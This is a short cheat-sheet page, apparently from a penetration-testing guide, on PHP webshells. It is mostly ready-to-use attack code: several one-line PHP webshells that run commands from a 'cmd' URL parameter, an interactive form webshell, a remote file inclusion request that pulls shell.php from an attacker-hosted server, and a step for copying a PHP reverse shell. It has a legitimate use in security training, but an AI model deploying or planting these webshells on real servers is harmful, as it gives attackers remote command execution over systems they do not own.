---
sidebar_position: 9
---

# Webshell (PHP)

A webshell is a script that enables remote command execution on a web server. Below are common PHP webshell examples and usage tips for penetration testing.

- [Total OSCP Guide: Webshells](https://sushant747.gitbooks.io/total-oscp-guide/content/webshell.html)
- [PHP Webshell Gist (joswr1ght)](https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985)

## Hosting a Webshell

To serve a local file for remote inclusion:

```bash
python -m http.server 80
```

Example vulnerable request:

```
http://10.10.10.10/index.php?page=http://192.168.0.1/shell.php
http://10.10.10.10/index.php?page=http://192.168.0.1/shell.php%00
```

## Simple PHP Webshells

```php
<?php system("whoami"); ?>
```

```php
<?php system($_GET["cmd"]);?>
```

```php
<?php if(isset($_GET["cmd"])) { system($_GET["cmd"]); } ?>
```

```php
<?php passthru($_GET["cmd"]);?>
```

```php
<?php echo shell_exec("whoami");?>
```

## Interactive Webshell Example

```php
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
</html>
```

## Reverse Shell

Copy a ready-made reverse shell:

```bash
sudo cp /usr/share/webshells/php/php-reverse-shell.php .
```
